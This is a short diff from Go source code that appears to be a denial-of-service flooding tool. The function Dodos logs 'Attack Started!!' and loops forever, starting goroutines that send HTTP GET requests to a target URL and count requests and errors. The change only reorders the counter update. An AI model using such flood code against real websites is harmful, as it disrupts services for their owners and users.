@@ -19,8 +19,8 @@ func Dodos(url string)  {
   log.Print("Attack Started!!")
   for {
     go func ()  {
-      _, err := http.Get(url)
       *Tr = *Tr + 1
+      _, err := http.Get(url)
       if err != nil {
         *Tb = *Tb + 1
       }else{
